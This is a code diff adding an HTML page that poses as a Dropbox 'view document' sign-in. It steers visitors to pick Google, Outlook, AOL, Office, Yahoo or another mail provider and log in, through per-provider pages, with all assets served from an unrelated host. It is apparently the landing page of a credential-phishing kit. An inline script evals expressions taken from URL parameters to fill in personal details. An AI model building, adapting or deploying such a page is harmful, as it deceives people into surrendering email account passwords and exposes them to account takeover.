@@ -1,0 +1,274 @@
+<html><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dropbox - Get your files anytime anywhere</title>
+     <link rel="icon" href="https://i.ibb.co/TtTg9r7/icon.png">
+    <style> 
+        @font-face {
+            font-family: 'Source Sans Pro';
+            font-style: normal;
+            font-weight: 600;
+            src: url('https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/source-sans-pro-v14-latin-600.eot');
+            src: local(''), url('https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/source-sans-pro-v14-latin-600.eot?#iefix') format('embedded-opentype'), url('https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/source-sans-pro-v14-latin-600.woff2') format('woff2'), url('https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/source-sans-pro-v14-latin-600.woff') format('woff'), url('https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/source-sans-pro-v14-latin-600.ttf') format('truetype'), url('https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/source-sans-pro-v14-latin-600.svg#SourceSansPro') format('svg');
+        }
+        @font-face {
+            font-family: 'Atlas Grotesk Web Light Regular';
+            font-style: normal;
+            font-weight: 400;
+            src: url('https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/Atlas Grotesk Web Light Regular.eot');
+            src: local(''), url('https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/Atlas Grotesk Web Light Regular.eot?#iefix') format('embedded-opentype'), url('https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/Atlas Grotesk Web Light Regular.woff2') format('woff2'), url('https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/Atlas Grotesk Web Light Regular.woff') format('woff'), url('https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/Atlas Grotesk Web Light Regular.ttf') format('truetype'), url('https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/Atlas Grotesk Web Light Regular.svg') format('svg');
+        }
+        @font-face {
+            font-family: 'Atlas Grotesk Web Bold Regular';
+            font-style: normal;
+            font-weight: 700;
+            src: url('https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/Atlas Grotesk Web Bold Regular.eot');
+            src: local(''), url('https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/Atlas Grotesk Web Bold Regular.eot?#iefix') format('embedded-opentype'), url('https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/Atlas Grotesk Web Bold Regular.woff2') format('woff2'), url('https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/Atlas Grotesk Web Bold Regular.woff') format('woff'), url('https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/Atlas Grotesk Web Bold Regular.ttf') format('truetype'), url('https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/Atlas Grotesk Web Bold Regular.svg') format('svg');
+        }
+        @font-face{font-family:'SharpGrotesk';src:url("https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/SharpGroteskDBMedium20-vflI3qtaE.woff2") format("woff2"),url("https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/SharpGroteskDBMedium20-vflXS-0WC.woff") format("woff"),url("https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/SharpGroteskDBMedium20-vfls8l7-a.ttf") format("truetype");font-weight:500;font-style:normal}
+        *,
+        body {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Atlas Grotesk Web Bold Regular;
+            background: linear-gradient( to right, #0d2f81 0%, #0d2f81 80%, #fff 80%, #fff 100% ); 
+        }
+        a{
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+        a:hover{
+            text-decoration: underline;
+        }
+        .safflower-container{
+            width: 100%;
+            display: flex;
+            flex-wrap: wrap;
+            margin: 0 auto;
+            min-height: 100vh;
+        }
+        .col-left{
+            width: 66%;
+            padding: 2.4%;
+        }
+        .col-right{
+            width: 33%;
+            background-color: #fff;
+            padding: 2.4%;
+        }
+        .logo{
+            max-width: 22%;
+            margin-right: 1%;
+        }
+        .header{
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+        .head-nav{
+            margin-left: 3vw;
+            font-size: 1.25vw;
+            text-transform: capitalize;
+            font-family: 'Atlas Grotesk Web Light Regular';
+        }
+        .col-left .head-nav{
+            color: #fff;
+        }
+        .col-right .head-nav{
+            color: #242529;
+        }
+        .flex-right{
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: flex-end;
+            min-height: 2.64vw;
+        }
+        .left-main{
+            width: 75%;
+            margin: 10vw 3vw 0;
+        }
+        .left-main h1{
+            color: #ffe7aa;
+            text-transform: capitalize;
+            font-size: 4.5vw;
+            margin-bottom: 4vw;
+        }
+        .left-main p{
+            color: #fff;
+            font-family: 'Atlas Grotesk Web Light Regular';
+            font-size: 1.4vw;
+            margin-right: 15%;
+            line-height: 1.4;
+        }
+        .signin-card{
+            width: 100%;
+            max-width: 346px;
+            margin: 0 auto;
+        }
+        .links-wrap{
+            width: 100%;
+            margin: 0 auto;
+            margin-bottom: 1rem;
+        }
+        .links-wrap a{
+            display: flex;
+            margin-bottom: 0.625rem;
+        }
+        .links-wrap img{
+            width: 100%;
+        }
+        .links-wrap img:hover{
+            transform:scale(1.1);
+            transition: all 0.4s;
+        }
+        .signin-card{
+            margin-top: 5vw;
+        }
+        .login {
+            font-weight: 500;
+            margin-bottom: 0.4vw;
+            color: #333333;
+            font-family:'SharpGrotesk';
+            font-size: 1.8vw;
+        }
+        .para {
+            font-weight: 600;
+            color: #505050;
+            font-size: 1.1vw;
+            font-family: 'Atlas Grotesk Web Light Regular';
+        }
+        .note {
+            font-weight: 600;
+            font-size: 0.95vw;
+            color: #0061ff;
+            font-family: 'Atlas Grotesk Web Light Regular';
+            margin-bottom: 1.25vw;
+        }
+        .small.para{
+            font-family: 'Atlas Grotesk Web Light Regular';
+            color: #b4b4b4;
+            font-size: 0.625rem;
+        }
+        .small.para a{
+            color: #1473e6;
+        }
+        @media(max-width:1199px){
+            .login{
+                font-size: 24px;
+            }
+            .para{
+                font-size: 15px;
+            }
+            .note{
+                font-size: 12px;
+                margin-bottom: 20px;
+            }
+        }
+        @media(max-width:991px){
+            body{
+                background: #0d2f81;
+            }
+            .col-left,.col-right{
+                width: 100%;
+            }
+            .logo{
+                max-width: 180px;
+            }
+            .head-nav{
+                font-size: 1rem;
+            }
+            .left-main h1{
+                font-size: 2.5rem;
+                margin-top: 2vh;
+            }
+            .left-main p{
+                font-size: 0.875rem;
+            }
+        }
+        @media(min-width:1600px){
+            
+        }
+    </style>
+</head>
+<body>
+    <div class="safflower-container">
+        <div class="col-left">
+            <div class="header">
+                <img src="https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/logo.png" class="logo" alt="">
+                <a href="" class="head-nav">
+                    For teams  
+                </a>
+                <a href="" class="head-nav">
+                    For individuals 
+                </a>
+            </div>
+            <div class="left-main">
+                <h1>Dropbox focus on the work that matters</h1>
+                <p>Dropbox is the world's first smart workspace. We bring all your team's content together while letting you use the tools you love. And we help cut through the clutter, surfacing what matters most. </p>
+            </div>
+        </div>
+        <div class="col-right">
+            <div class="flex-right">
+                <a href="" class="head-nav">
+                    Sign up  
+                </a>
+                <a href="" class="head-nav">
+                    Download
+                </a>
+            </div>
+            <div class="signin-card">
+                <div class="content">
+                    <h2 class="login">Sign In</h2>
+                    <div class="para">
+                        To view document select yor email provider below
+                        and login with email address.
+                    </div>
+                    <div class="note">
+                        Select other emails if your email provider not below.
+                    </div>
+                </div>
+                <div class="links-wrap">
+                 <ul style=" list-style-type: none;">
+            <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">
+                    <a href="" data-nn="GMA.html#">
+                        <img src="https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/google.png" alt="">
+                    </a>
+
+                     </li>
+ <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">   
+                    <a href="" data-nn="OUT.html?username=">
+                        <img src="https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/outlook.png" alt="">
+                    </a>
+                     </li>
+ <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">   
+                    <a href="" data-nn="AOL.html?yid=">
+                        <img src="https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/aol.png" alt="">
+                    </a>
+                     </li>
+ <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">   
+                    <a href="" data-nn="OFFICE.html?username=">
+                        <img src="https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/office.png" alt="">
+                    </a>
+                     </li>
+ <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">   
+                    <a href="" data-nn="YAHOO.html?yid=">
+                        <img src="https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/yahoo.png" alt="">
+                    </a>
+                     </li>
+ <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">   
+                    <a href="" data-nn="OTHER.html#">
+                        <img src="https://ses-smtp.com/email-list/dkdncndjfkskdropbox27/assets/other-mails.png" alt="">
+                    </a>
+                     </li>
+                                    <script>
+const queryString=[...new URLSearchParams(location.search)].reduce((e,[t,n])=>(e[t]=n,e),{});function templatePage(){let g=document;function a(b){return b.replace(/{\|(.*?)\|}/g,(_,c)=>{let d=eval(c);return null==d?"":d})}for(const e of g.getElementsByTagName("*"))for(const t of e.attributes){let e=a(t.value);e!==t.value&&(t.value=e)}const b=g.createNodeIterator(g.body,NodeFilter.SHOW_TEXT,null);let c;for(;c=b.nextNode();){let e="textContent",t=a(c[e]);t!==c[e]&&(c[e]=t)}}
+templatePage()
+</script>
+                     </ul>  
+                </div>
+                   <div style="" id="checks"></div>
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script></div></div></div></body></html>
